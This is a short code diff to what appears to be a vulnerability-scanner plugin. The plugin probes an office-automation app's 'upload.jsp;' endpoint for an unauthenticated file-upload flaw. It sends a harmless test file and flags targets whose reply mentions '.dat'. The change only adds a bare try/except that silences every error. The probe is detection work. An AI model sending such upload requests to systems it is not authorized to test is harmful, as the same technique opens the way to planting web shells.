@@ -24,8 +24,11 @@ class Script(BaseScript):
                         url = path + "OAapp/jsp/upload.jsp;"
                         form = FormData()
                         form.add_field('file', "1", filename="1.txt", content_type='application/octet-stream')
-                        async with session.post(url=url, data=form) as res:
-                            if res:
-                                text = await res.text()
-                                if '.dat' in text:
-                                    yield url
+                        try:
+                            async with session.post(url=url, data=form) as res:
+                                if res:
+                                    text = await res.text()
+                                    if '.dat' in text:
+                                        yield url
+                        except:
+                            pass
